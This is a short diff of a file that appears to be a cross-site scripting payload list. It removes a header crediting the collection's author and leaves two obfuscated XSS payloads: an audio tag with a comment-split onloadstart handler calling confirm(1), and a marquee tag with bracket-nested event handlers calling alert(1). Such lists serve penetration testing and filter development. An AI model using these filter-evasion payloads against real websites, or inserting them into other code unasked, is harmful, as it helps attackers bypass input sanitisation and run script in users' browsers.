@@ -1,9 +1,3 @@
-#############################################################
-#  XSS-Payloads   https://github.com/RenwaX23/XSS-Payloads  #
-#             https://twitter.com/RenwaX23                  #
-#############################################################
-
-
 <AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x
 
 <mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ]
